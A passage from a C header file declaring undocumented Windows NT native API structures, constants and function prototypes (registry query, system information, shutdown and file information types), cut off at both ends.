RTL_REGISTRY_DEVICEMAP    4             // \\Registry\\Machine\\Hardware\\DeviceMap\r\n#define RTL_REGISTRY_USER         5             // \\Registry\\User\\CurrentUser\r\n#define RTL_REGISTRY_MAXIMUM      6\r\n#define RTL_REGISTRY_HANDLE       0x40000000    // Low order bits are registry handle\r\n#define RTL_REGISTRY_OPTIONAL     0x80000000    // Indicates the key node is optional\r\n\r\n\r\ntypedef NTSTATUS (NTAPI * PRTL_QUERY_REGISTRY_ROUTINE)(\r\n    IN PWSTR ValueName,\r\n    IN ULONG ValueType,\r\n    IN PVOID ValueData,\r\n    IN ULONG ValueLength,\r\n    IN PVOID Context,\r\n    IN PVOID EntryContext\r\n    );\r\n\r\ntypedef struct _RTL_QUERY_REGISTRY_TABLE\r\n{\r\n    PRTL_QUERY_REGISTRY_ROUTINE QueryRoutine;\r\n    ULONG Flags;\r\n    PWSTR Name;\r\n    PVOID EntryContext;\r\n    ULONG DefaultType;\r\n    PVOID DefaultData;\r\n    ULONG DefaultLength;\r\n\r\n} RTL_QUERY_REGISTRY_TABLE, *PRTL_QUERY_REGISTRY_TABLE;\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS \r\nNTAPI\r\nRtlQueryRegistryValues(\r\n    IN ULONG  RelativeTo,\r\n    IN PCWSTR  Path,\r\n    IN PRTL_QUERY_REGISTRY_TABLE  QueryTable,\r\n    IN PVOID  Context,\r\n    IN PVOID  Environment OPTIONAL\r\n    );\r\n\r\n\r\n//                                                  \r\n// Thread priority                                  \r\n//                                                  \r\n                                                    \r\ntypedef LONG KPRIORITY;\r\n\r\n//\r\n// Processor information\r\n// NtQuerySystemInformation with SystemProcessorInformation\r\n//\r\n\r\ntypedef struct _SYSTEM_PROCESSOR_INFORMATION {\r\n    USHORT ProcessorArchitecture;\r\n    USHORT ProcessorLevel;\r\n    USHORT ProcessorRevision;\r\n    USHORT Reserved;\r\n    ULONG ProcessorFeatureBits;\r\n} SYSTEM_PROCESSOR_INFORMATION, *PSYSTEM_PROCESSOR_INFORMATION;\r\n\r\n//\r\n// Device information\r\n// NtQuerySystemInformation with SystemDeviceInformation\r\n//\r\n\r\ntypedef struct _SYSTEM_DEVICE_INFORMATION {\r\n    ULONG NumberOfDisks;\r\n    ULONG NumberOfFloppies;\r\n    ULONG NumberOfCdRoms;\r\n    ULONG NumberOfTapes;\r\n    ULONG NumberOfSerialPorts;\r\n    ULONG NumberOfParallelPorts;\r\n} SYSTEM_DEVICE_INFORMATION, *PSYSTEM_DEVICE_INFORMATION;\r\n\r\n//\r\n// NT Global Flag information\r\n// NtQuerySystemInformation with SystemFlagsInformation\r\n//\r\n\r\ntypedef struct _SYSTEM_FLAGS_INFORMATION\r\n{\r\n    ULONG GlobalFlag;\r\n        \r\n} SYSTEM_FLAGS_INFORMATION, *PSYSTEM_FLAGS_INFORMATION;\r\n\r\n//\r\n// System Module information \r\n// NtQuerySystemInformation with SystemModuleInformation\r\n//\r\n\r\ntypedef struct _SYSTEM_MODULE\r\n{\r\n    HANDLE Section;                 // Not filled in\r\n    PVOID  MappedBase;\r\n    PVOID  ImageBase;\r\n    ULONG  ImageSize;\r\n    ULONG  Flags;\r\n    USHORT LoadOrderIndex;\r\n    USHORT InitOrderIndex;\r\n    USHORT LoadCount;\r\n    USHORT OffsetToFileName;\r\n    CHAR   ImageName[256];\r\n\r\n} SYSTEM_MODULE, *PSYSTEM_MODULE;\r\n\r\n\r\ntypedef struct _SYSTEM_MODULE_INFORMATION\r\n{\r\n    ULONG         ModulesCount;\r\n    SYSTEM_MODULE Modules[1];\r\n\r\n} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;\r\n\r\n/*\r\ntypedef struct _SYSTEM_VDM_INSTEMUL_INFO {\r\n    ULONG SegmentNotPresent ;\r\n    ULONG VdmOpcode0F       ;\r\n    ULONG OpcodeESPrefix    ;\r\n    ULONG OpcodeCSPrefix    ;\r\n    ULONG OpcodeSSPrefix    ;\r\n    ULONG OpcodeDSPrefix    ;\r\n    ULONG OpcodeFSPrefix    ;\r\n    ULONG OpcodeGSPrefix    ;\r\n    ULONG OpcodeOPER32Prefix;\r\n    ULONG OpcodeADDR32Prefix;\r\n    ULONG OpcodeINSB        ;\r\n    ULONG OpcodeINSW        ;\r\n    ULONG OpcodeOUTSB       ;\r\n    ULONG OpcodeOUTSW       ;\r\n    ULONG OpcodePUSHF       ;\r\n    ULONG OpcodePOPF        ;\r\n    ULONG OpcodeINTnn       ;\r\n    ULONG OpcodeINTO        ;\r\n    ULONG OpcodeIRET        ;\r\n    ULONG OpcodeINBimm      ;\r\n    ULONG OpcodeINWimm      ;\r\n    ULONG OpcodeOUTBimm     ;\r\n    ULONG OpcodeOUTWimm     ;\r\n    ULONG OpcodeINB         ;\r\n    ULONG OpcodeINW         ;\r\n    ULONG OpcodeOUTB        ;\r\n    ULONG OpcodeOUTW        ;\r\n    ULONG OpcodeLOCKPrefix  ;\r\n    ULONG OpcodeREPNEPrefix ;\r\n    ULONG OpcodeREPPrefix   ;\r\n    ULONG OpcodeHLT         ;\r\n    ULONG OpcodeCLI         ;\r\n    ULONG OpcodeSTI         ;\r\n    ULONG BopCount          ;\r\n} SYSTEM_VDM_INSTEMUL_INFO, *PSYSTEM_VDM_INSTEMUL_INFO;\r\n\r\n\r\ntypedef struct _SYSTEM_QUERY_TIME_ADJUST_INFORMATION {\r\n    ULONG TimeAdjustment;\r\n    ULONG TimeIncrement;\r\n    BOOLEAN Enable;\r\n} SYSTEM_QUERY_TIME_ADJUST_INFORMATION, *PSYSTEM_QUERY_TIME_ADJUST_INFORMATION;\r\n\r\ntypedef struct _SYSTEM_SET_TIME_ADJUST_INFORMATION {\r\n    ULONG TimeAdjustment;\r\n    BOOLEAN Enable;\r\n} SYSTEM_SET_TIME_ADJUST_INFORMATION, *PSYSTEM_SET_TIME_ADJUST_INFORMATION;\r\n\r\n\r\ntypedef struct _SYSTEM_THREAD_INFORMATION {\r\n    LARGE_INTEGER KernelTime;\r\n    LARGE_INTEGER UserTime;\r\n    LARGE_INTEGER CreateTime;\r\n    ULONG WaitTime;\r\n    PVOID StartAddress;\r\n    CLIENT_ID ClientId;\r\n    KPRIORITY Priority;\r\n    LONG BasePriority;\r\n    ULONG ContextSwitches;\r\n    ULONG ThreadState;\r\n    ULONG WaitReason;\r\n} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;\r\n\r\ntypedef struct _SYSTEM_MEMORY_INFO {\r\n    PUCHAR StringOffset;\r\n    USHORT ValidCount;\r\n    USHORT TransitionCount;\r\n    USHORT ModifiedCount;\r\n    USHORT PageTableCount;\r\n} SYSTEM_MEMORY_INFO, *PSYSTEM_MEMORY_INFO;\r\n\r\ntypedef struct _SYSTEM_MEMORY_INFORMATION {\r\n    ULONG InfoSize;\r\n    ULONG StringStart;\r\n    SYSTEM_MEMORY_INFO Memory[1];\r\n} SYSTEM_MEMORY_INFORMATION, *PSYSTEM_MEMORY_INFORMATION;\r\n\r\ntypedef struct _SYSTEM_CALL_COUNT_INFORMATION {\r\n    ULONG Length;\r\n    ULONG NumberOfTables;\r\n    //ULONG NumberOfEntries[NumberOfTables];\r\n    //ULONG CallCounts[NumberOfTables][NumberOfEntries];\r\n} SYSTEM_CALL_COUNT_INFORMATION, *PSYSTEM_CALL_COUNT_INFORMATION;\r\n\r\ntypedef struct _SYSTEM_CRASH_DUMP_INFORMATION {\r\n    HANDLE CrashDumpSection;\r\n} SYSTEM_CRASH_DUMP_INFORMATION, *PSYSTEM_CRASH_DUMP_INFORMATION;\r\n\r\ntypedef struct _SYSTEM_EXCEPTION_INFORMATION {\r\n    ULONG AlignmentFixupCount;\r\n    ULONG ExceptionDispatchCount;\r\n    ULONG FloatingEmulationCount;\r\n    ULONG ByteWordEmulationCount;\r\n} SYSTEM_EXCEPTION_INFORMATION, *PSYSTEM_EXCEPTION_INFORMATION;\r\n\r\ntypedef struct _SYSTEM_CRASH_STATE_INFORMATION {\r\n    ULONG ValidCrashDump;\r\n} SYSTEM_CRASH_STATE_INFORMATION, *PSYSTEM_CRASH_STATE_INFORMATION;\r\n\r\ntypedef struct _SYSTEM_KERNEL_DEBUGGER_INFORMATION {\r\n    BOOLEAN KernelDebuggerEnabled;\r\n    BOOLEAN KernelDebuggerNotPresent;\r\n} SYSTEM_KERNEL_DEBUGGER_INFORMATION, *PSYSTEM_KERNEL_DEBUGGER_INFORMATION;\r\n\r\ntypedef struct _SYSTEM_REGISTRY_QUOTA_INFORMATION {\r\n    ULONG RegistryQuotaAllowed;\r\n    ULONG RegistryQuotaUsed;\r\n    ULONG PagedPoolSize;\r\n} SYSTEM_REGISTRY_QUOTA_INFORMATION, *PSYSTEM_REGISTRY_QUOTA_INFORMATION;\r\n*/\r\n\r\ntypedef struct _SYSTEM_GDI_DRIVER_INFORMATION {\r\n    UNICODE_STRING DriverName;\r\n    PVOID ImageAddress;\r\n    PVOID SectionPointer;\r\n    PVOID EntryPoint;\r\n    PIMAGE_EXPORT_DIRECTORY ExportSectionPointer;\r\n    ULONG ImageLength;\r\n} SYSTEM_GDI_DRIVER_INFORMATION, *PSYSTEM_GDI_DRIVER_INFORMATION;\r\n\r\ntypedef struct _SYSTEM_BOOT_ENVIRONMENT_INFORMATION {\r\n    GUID  CurrentBootGuid;\r\n    ULONG Unknown;\r\n} SYSTEM_BOOT_ENVIRONMENT_INFORMATION, *PSYSTEM_BOOT_ENVIRONMENT_INFORMATION;\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwQuerySystemInformation(\r\n    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,\r\n    OUT PVOID SystemInformation,\r\n    IN ULONG SystemInformationLength,\r\n    OUT PULONG ReturnLength\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtSetSystemInformation(\r\n    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,\r\n    IN PVOID SystemInformation,\r\n    IN ULONG SystemInformationLength\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwSetSystemInformation(\r\n    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,\r\n    IN PVOID SystemInformation,\r\n    IN ULONG SystemInformationLength\r\n    );\r\n\r\n//------------------------------------------------------------------------------\r\n// Shutdown system\r\n\r\ntypedef enum _SHUTDOWN_ACTION\r\n{\r\n    ShutdownNoReboot,\r\n    ShutdownReboot,\r\n    ShutdownPowerOff\r\n\r\n} SHUTDOWN_ACTION, *PSHUTDOWN_ACTION;\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtShutdownSystem(\r\n    IN SHUTDOWN_ACTION Action\r\n    ); \r\n\r\n//-----------------------------------------------------------------------------\r\n// File functions\r\n\r\n#ifndef OLD_DOS_VOLID\r\n#define OLD_DOS_VOLID   0x00000008\r\n#endif\r\n \r\n#ifndef FILE_SUPERSEDE\r\n#define FILE_SUPERSEDE                  0x00000000\r\n#define FILE_OPEN                       0x00000001\r\n#define FILE_CREATE                     0x00000002\r\n#define FILE_OPEN_IF                    0x00000003\r\n#define FILE_OVERWRITE                  0x00000004\r\n#define FILE_OVERWRITE_IF               0x00000005\r\n#define FILE_MAXIMUM_DISPOSITION        0x00000005\r\n#endif  // File create flags\r\n\r\n\r\n// Define the create/open option flags\r\n#ifndef FILE_DIRECTORY_FILE\r\n#define FILE_DIRECTORY_FILE                     0x00000001\r\n#define FILE_WRITE_THROUGH                      0x00000002\r\n#define FILE_SEQUENTIAL_ONLY                    0x00000004\r\n#define FILE_NO_INTERMEDIATE_BUFFERING          0x00000008\r\n#define FILE_SYNCHRONOUS_IO_ALERT               0x00000010\r\n#define FILE_SYNCHRONOUS_IO_NONALERT            0x00000020\r\n#define FILE_NON_DIRECTORY_FILE                 0x00000040\r\n#define FILE_CREATE_TREE_CONNECTION             0x00000080\r\n#define FILE_COMPLETE_IF_OPLOCKED               0x00000100\r\n#define FILE_NO_EA_KNOWLEDGE                    0x00000200\r\n#define FILE_OPEN_FOR_RECOVERY                  0x00000400\r\n#define FILE_RANDOM_ACCESS                      0x00000800\r\n#define FILE_DELETE_ON_CLOSE                    0x00001000\r\n#define FILE_OPEN_BY_FILE_ID                    0x00002000\r\n#define FILE_OPEN_FOR_BACKUP_INTENT             0x00004000\r\n#define FILE_NO_COMPRESSION                     0x00008000\r\n#define FILE_OPEN_REQUIRING_OPLOCK              0x00010000\r\n#define FILE_DISALLOW_EXCLUSIVE                 0x00020000\r\n#define FILE_RESERVE_OPFILTER                   0x00100000\r\n#define FILE_OPEN_REPARSE_POINT                 0x00200000\r\n#define FILE_OPEN_NO_RECALL                     0x00400000\r\n#define FILE_OPEN_FOR_FREE_SPACE_QUERY          0x00800000\r\n#endif // FILE_DIRECTORY_FILE\r\n\r\n\r\n//\r\n// Define the I/O status information return values for NtCreateFile/NtOpenFile\r\n//\r\n\r\n#ifndef FILE_SUPERSEDED\r\n#define FILE_SUPERSEDED                 0x00000000\r\n#define FILE_OPENED                     0x00000001\r\n#define FILE_CREATED                    0x00000002\r\n#define FILE_OVERWRITTEN                0x00000003\r\n#define FILE_EXISTS                     0x00000004\r\n#define FILE_DOES_NOT_EXIST             0x00000005\r\n#endif\r\n\r\n\r\n#ifndef PIO_APC_ROUTINE_DEFINED\r\ntypedef\r\nVOID\r\n(NTAPI *PIO_APC_ROUTINE) (\r\n    IN PVOID ApcContext,\r\n    IN PIO_STATUS_BLOCK IoStatusBlock,\r\n    IN ULONG Reserved\r\n    );\r\n#define PIO_APC_ROUTINE_DEFINED\r\n#endif  // PIO_APC_ROUTINE_DEFINED\r\n\r\n\r\ntypedef struct _FILE_DIRECTORY_INFORMATION {\r\n    ULONG NextEntryOffset;\r\n    ULONG FileIndex;\r\n    LARGE_INTEGER CreationTime;\r\n    LARGE_INTEGER LastAccessTime;\r\n    LARGE_INTEGER LastWriteTime;\r\n    LARGE_INTEGER ChangeTime;\r\n    LARGE_INTEGER EndOfFile;\r\n    LARGE_INTEGER AllocationSize;\r\n    ULONG FileAttributes;\r\n    ULONG FileNameLength;\r\n    WCHAR FileName[1];\r\n} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_FULL_DIR_INFORMATION {\r\n    ULONG NextEntryOffset;\r\n    ULONG FileIndex;\r\n    LARGE_INTEGER CreationTime;\r\n    LARGE_INTEGER LastAccessTime;\r\n    LARGE_INTEGER LastWriteTime;\r\n    LARGE_INTEGER ChangeTime;\r\n    LARGE_INTEGER EndOfFile;\r\n    LARGE_INTEGER AllocationSize;\r\n    ULONG FileAttributes;\r\n    ULONG FileNameLength;\r\n    ULONG EaSize;\r\n    WCHAR FileName[1];\r\n} FILE_FULL_DIR_INFORMATION, *PFILE_FULL_DIR_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_BOTH_DIR_INFORMATION {\r\n    ULONG NextEntryOffset;\r\n    ULONG FileIndex;\r\n    LARGE_INTEGER CreationTime;\r\n    LARGE_INTEGER LastAccessTime;\r\n    LARGE_INTEGER LastWriteTime;\r\n    LARGE_INTEGER ChangeTime;\r\n    LARGE_INTEGER EndOfFile;\r\n    LARGE_INTEGER AllocationSize;\r\n    ULONG FileAttributes;\r\n    ULONG FileNameLength;\r\n    ULONG EaSize;\r\n    CCHAR ShortNameLength;\r\n    WCHAR ShortName[12];\r\n    WCHAR FileName[1];\r\n} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_BASIC_INFORMATION {                    \r\n    LARGE_INTEGER CreationTime;                             \r\n    LARGE_INTEGER LastAccessTime;                           \r\n    LARGE_INTEGER LastWriteTime;                            \r\n    LARGE_INTEGER ChangeTime;                               \r\n    ULONG FileAttributes;                                   \r\n} FILE_BASIC_INFORMATION, *PFILE_BASIC_INFORMATION;         \r\n\r\n\r\ntypedef struct _FILE_STANDARD_INFORMATION {                 \r\n    LARGE_INTEGER AllocationSize;                           \r\n    LARGE_INTEGER EndOfFile;                                \r\n    ULONG NumberOfLinks;                                    \r\n    BOOLEAN DeletePending;                                  \r\n    BOOLEAN Directory;                                      \r\n} FILE_STANDARD_INFORMATION, *PFILE_STANDARD_INFORMATION;   \r\n\r\n\r\ntypedef struct _FILE_INTERNAL_INFORMATION {\r\n    LARGE_INTEGER IndexNumber;\r\n} FILE_INTERNAL_INFORMATION, *PFILE_INTERNAL_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_EA_INFORMATION {\r\n    ULONG EaSize;\r\n} FILE_EA_INFORMATION, *PFILE_EA_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_ACCESS_INFORMATION {\r\n    ACCESS_MASK AccessFlags;\r\n} FILE_ACCESS_INFORMATION, *PFILE_ACCESS_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_NAME_INFORMATION {                     \r\n    ULONG FileNameLength;                                   \r\n    WCHAR FileName[1];                                      \r\n} FILE_NAME_INFORMATION, *PFILE_NAME_INFORMATION;           \r\n\r\n\r\ntypedef struct _FILE_RENAME_INFORMATION {\r\n    BOOLEAN ReplaceIfExists;\r\n    HANDLE RootDirectory;\r\n    ULONG FileNameLength;\r\n    WCHAR FileName[1];\r\n} FILE_RENAME_INFORMATION, *PFILE_RENAME_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_NAMES_INFORMATION {\r\n    ULONG NextEntryOffset;\r\n    ULONG FileIndex;\r\n    ULONG FileNameLength;\r\n    WCHAR FileName[1];\r\n} FILE_NAMES_INFORMATION, *PFILE_NAMES_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_DISPOSITION_INFORMATION {                  \r\n    BOOLEAN DeleteFile;                                         \r\n} FILE_DISPOSITION_INFORMATION, *PFILE_DISPOSITION_INFORMATION; \r\n                                                              \r\n\r\ntypedef struct _FILE_POSITION_INFORMATION {                 \r\n    LARGE_INTEGER CurrentByteOffset;                        \r\n} FILE_POSITION_INFORMATION, *PFILE_POSITION_INFORMATION;   \r\n\r\n\r\ntypedef struct _FILE_FULL_EA_INFORMATION {\r\n    ULONG NextEntryOffset;\r\n    UCHAR Flags;\r\n    UCHAR EaNameLength;\r\n    USHORT EaValueLength;\r\n    CHAR EaName[1];\r\n} FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_MODE_INFORMATION {\r\n    ULONG Mode;\r\n} FILE_MODE_INFORMATION, *PFILE_MODE_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_ALIGNMENT_INFORMATION {                \r\n    ULONG AlignmentRequirement;                             \r\n} FILE_ALIGNMENT_INFORMATION, *PFILE_ALIGNMENT_INFORMATION; \r\n\r\n\r\ntypedef struct _FILE_ALL_INFORMATION {\r\n    FILE_BASIC_INFORMATION BasicInformation;\r\n    FILE_STANDARD_INFORMATION StandardInformation;\r\n    FILE_INTERNAL_INFORMATION InternalInformation;\r\n    FILE_EA_INFORMATION EaInformation;\r\n    FILE_ACCESS_INFORMATION AccessInformation;\r\n    FILE_POSITION_INFORMATION PositionInformation;\r\n    FILE_MODE_INFORMATION ModeInformation;\r\n    FILE_ALIGNMENT_INFORMATION AlignmentInformation;\r\n    FILE_NAME_INFORMATION NameInformation;\r\n} FILE_ALL_INFORMATION, *PFILE_ALL_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_ALLOCATION_INFORMATION {\r\n    LARGE_INTEGER AllocationSize;\r\n} FILE_ALLOCATION_INFORMATION, *PFILE_ALLOCATION_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_END_OF_FILE_INFORMATION {                 \r\n    LARGE_INTEGER EndOfFile;                                   \r\n} FILE_END_OF_FILE_INFORMATION, *PFILE_END_OF_FILE_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_STREAM_INFORMATION {\r\n    ULONG NextEntryOffset;\r\n    ULONG StreamNameLength;\r\n    LARGE_INTEGER StreamSize;\r\n    LARGE_INTEGER StreamAllocationSize;\r\n    WCHAR StreamName[1];\r\n} FILE_STREAM_INFORMATION, *PFILE_STREAM_INFORMATION;\r\n\r\ntypedef struct _FILE_PIPE_INFORMATION {\r\n     ULONG ReadMode;\r\n     ULONG CompletionMode;\r\n} FILE_PIPE_INFORMATION, *PFILE_PIPE_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_PIPE_LOCAL_INFORMATION {\r\n     ULONG NamedPipeType;\r\n     ULONG NamedPipeConfiguration;\r\n     ULONG MaximumInstances;\r\n     ULONG CurrentInstances;\r\n     ULONG InboundQuota;\r\n     ULONG ReadDataAvailable;\r\n     ULONG OutboundQuota;\r\n     ULONG WriteQuotaAvailable;\r\n     ULONG NamedPipeState;\r\n     ULONG NamedPipeEnd;\r\n} FILE_PIPE_LOCAL_INFORMATION, *PFILE_PIPE_LOCAL_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_PIPE_REMOTE_INFORMATION {\r\n     LARGE_INTEGER CollectDataTime;\r\n     ULONG MaximumCollectionCount;\r\n} FILE_PIPE_REMOTE_INFORMATION, *PFILE_PIPE_REMOTE_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_MAILSLOT_QUERY_INFORMATION {\r\n    ULONG MaximumMessageSize;\r\n    ULONG MailslotQuota;\r\n    ULONG NextMessageSize;\r\n    ULONG MessagesAvailable;\r\n    LARGE_INTEGER ReadTimeout;\r\n} FILE_MAILSLOT_QUERY_INFORMATION, *PFILE_MAILSLOT_QUERY_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_MAILSLOT_SET_INFORMATION {\r\n    PLARGE_INTEGER ReadTimeout;\r\n} FILE_MAILSLOT_SET_INFORMATION, *PFILE_MAILSLOT_SET_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_COMPRESSION_INFORMATION {\r\n    LARGE_INTEGER CompressedFileSize;\r\n    USHORT CompressionFormat;\r\n    UCHAR CompressionUnitShift;\r\n    UCHAR ChunkShift;\r\n    UCHAR ClusterShift;\r\n    UCHAR Reserved[3];\r\n} FILE_COMPRESSION_INFORMATION, *PFILE_COMPRESSION_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_LINK_INFORMATION {\r\n    BOOLEAN ReplaceIfExists;\r\n    HANDLE RootDirectory;\r\n    ULONG FileNameLength;\r\n    WCHAR FileName[1];\r\n} FILE_LINK_INFORMATION, *PFILE_LINK_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_OBJECTID_INFORMATION\r\n{\r\n    LONGLONG FileReference;\r\n    UCHAR ObjectId[16];\r\n    union {\r\n        struct {\r\n            UCHAR BirthVolumeId[16];\r\n            UCHAR BirthObjectId[16];\r\n            UCHAR DomainId[16];\r\n        } ;\r\n        UCHAR ExtendedInfo[48];\r\n    };\r\n} FILE_OBJECTID_INFORMATION, *PFILE_OBJECTID_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_COMPLETION_INFORMATION {\r\n    HANDLE Port;\r\n    PVOID Key;\r\n} FILE_COMPLETION_INFORMATION, *PFILE_COMPLETION_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_MOVE_CLUSTER_INFORMATION {\r\n    ULONG ClusterCount;\r\n    HANDLE RootDirectory;\r\n    ULONG FileNameLength;\r\n    WCHAR FileName[1];\r\n} FILE_MOVE_CLUSTER_INFORMATION, *PFILE_MOVE_CLUSTER_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_NETWORK_OPEN_INFORMATION {                 \r\n    LARGE_INTEGER CreationTime;                                 \r\n    LARGE_INTEGER LastAccessTime;                               \r\n    LARGE_INTEGER LastWriteTime;                                \r\n    LARGE_INTEGER ChangeTime;                                   \r\n    LARGE_INTEGER AllocationSize;                               \r\n    LARGE_INTEGER EndOfFile;                                    \r\n    ULONG FileAttributes;                                       \r\n} FILE_NETWORK_OPEN_INFORMATION, *PFILE_NETWORK_OPEN_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_ATTRIBUTE_TAG_INFORMATION {               \r\n    ULONG FileAttributes;                                       \r\n    ULONG ReparseTag;                                           \r\n} FILE_ATTRIBUTE_TAG_INFORMATION, *PFILE_ATTRIBUTE_TAG_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_TRACKING_INFORMATION {\r\n    HANDLE DestinationFile;\r\n    ULONG ObjectInformationLength;\r\n    CHAR ObjectInformation[1];\r\n} FILE_TRACKING_INFORMATION, *PFILE_TRACKING_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_REPARSE_POINT_INFORMATION {\r\n    LONGLONG FileReference;\r\n    ULONG Tag;\r\n} FILE_REPARSE_POINT_INFORMATION, *PFILE_REPARSE_POINT_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_QUOTA_INFORMATION {\r\n    ULONG NextEntryOffset;\r\n    ULONG SidLength;\r\n    LARGE_INTEGER ChangeTime;\r\n    LARGE_INTEGER QuotaUsed;\r\n    LARGE_INTEGER QuotaThreshold;\r\n    LARGE_INTEGER QuotaLimit;\r\n    SID Sid;\r\n} FILE_QUOTA_INFORMATION, *PFILE_QUOTA_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_ID_BOTH_DIR_INFORMATION {\r\n    ULONG NextEntryOffset;\r\n    ULONG FileIndex;\r\n    LARGE_INTEGER CreationTime;\r\n    LARGE_INTEGER LastAccessTime;\r\n    LARGE_INTEGER LastWriteTime;\r\n    LARGE_INTEGER ChangeTime;\r\n    LARGE_INTEGER EndOfFile;\r\n    LARGE_INTEGER AllocationSize;\r\n    ULONG FileAttributes;\r\n    ULONG FileNameLength;\r\n    ULONG EaSize;\r\n    CCHAR ShortNameLength;\r\n    WCHAR ShortName[12];\r\n    LARGE_INTEGER FileId;\r\n    WCHAR FileName[1];\r\n} FILE_ID_BOTH_DIR_INFORMATION, *PFILE_ID_BOTH_DIR_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_ID_FULL_DIR_INFORMATION {\r\n    ULONG NextEntryOffset;\r\n    ULONG FileIndex;\r\n    LARGE_INTEGER CreationTime;\r\n    LARGE_INTEGER LastAccessTime;\r\n    LARGE_INTEGER LastWriteTime;\r\n    LARGE_INTEGER ChangeTime;\r\n    LARGE_INTEGER EndOfFile;\r\n    LARGE_INTEGER AllocationSize;\r\n    ULONG FileAttributes;\r\n    ULONG FileNameLength;\r\n    ULONG EaSize;\r\n    LARGE_INTEGER FileId;\r\n    WCHAR FileName[1];\r\n} FILE_ID_FULL_DIR_INFORMATION, *PFILE_ID_FULL_DIR_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_VALID_DATA_LENGTH_INFORMATION {                        \r\n    LARGE_INTEGER ValidDataLength;                                          \r\n} FILE_VALID_DATA_LENGTH_INFORMATION, *PFILE_VALID_DATA_LENGTH_INFORMATION; \r\n\r\n//\r\n// Don't queue an entry to an associated completion port if returning success\r\n// synchronously.\r\n//\r\n#define FILE_SKIP_COMPLETION_PORT_ON_SUCCESS    0x1\r\n\r\n//\r\n// Don't set the file handle event on IO completion.\r\n//\r\n#define FILE_SKIP_SET_EVENT_ON_HANDLE           0x2\r\n\r\n//\r\n// Don't set user supplied event on successful fast-path IO completion.\r\n//\r\n#define FILE_SKIP_SET_USER_EVENT_ON_FAST_IO     0x4\r\n\r\ntypedef  struct _FILE_IO_COMPLETION_NOTIFICATION_INFORMATION {\r\n    ULONG Flags;\r\n} FILE_IO_COMPLETION_NOTIFICATION_INFORMATION, *PFILE_IO_COMPLETION_NOTIFICATION_INFORMATION;\r\n\r\n\r\ntypedef  struct _FILE_PROCESS_IDS_USING_FILE_INFORMATION {\r\n    ULONG NumberOfProcessIdsInList;\r\n    ULONG_PTR ProcessIdList[1];\r\n} FILE_PROCESS_IDS_USING_FILE_INFORMATION, *PFILE_PROCESS_IDS_USING_FILE_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_IOSTATUSBLOCK_RANGE_INFORMATION {\r\n    PUCHAR       IoStatusBlockRange;\r\n    ULONG        Length;\r\n} FILE_IOSTATUSBLOCK_RANGE_INFORMATION, *PFILE_IOSTATUSBLOCK_RANGE_INFORMATION;\r\n\r\n\r\ntypedef enum _IO_PRIORITY_HINT {\r\n    IoPriorityVeryLow = 0,    // Winfs promotion, defragging, content indexing and other background I/Os\r\n    IoPriorityLow,            // Prefetching for applications.\r\n    IoPriorityNormal,         // Normal I/Os\r\n    IoPriorityHigh,           // Used by filesystems for checkpoint I/O\r\n    IoPriorityCritical,       // Used by memory manager. Not available for applications.\r\n    MaxIoPriorityTypes\r\n} IO_PRIORITY_HINT;\r\n\r\n\r\ntypedef struct _FILE_IO_PRIORITY_HINT_INFORMATION {\r\n    IO_PRIORITY_HINT   PriorityHint;\r\n} FILE_IO_PRIORITY_HINT_INFORMATION, *PFILE_IO_PRIORITY_HINT_INFORMATION;\r\n\r\n\r\n//\r\n// Support to reserve bandwidth for a file handle.\r\n//\r\n\r\ntypedef struct _FILE_SFIO_RESERVE_INFORMATION {\r\n    ULONG RequestsPerPeriod;\r\n    ULONG Period;\r\n    BOOLEAN RetryFailures;\r\n    BOOLEAN Discardable;\r\n    ULONG RequestSize;\r\n    ULONG NumOutstandingRequests;\r\n} FILE_SFIO_RESERVE_INFORMATION, *PFILE_SFIO_RESERVE_INFORMATION;\r\n\r\n//\r\n// Support to query bandwidth properties of a volume.\r\n//\r\n\r\ntypedef struct _FILE_SFIO_VOLUME_INFORMATION {\r\n    ULONG MaximumRequestsPerPeriod;\r\n    ULONG MinimumPeriod;\r\n    ULONG MinimumTransferSize;\r\n} FILE_SFIO_VOLUME_INFORMATION, 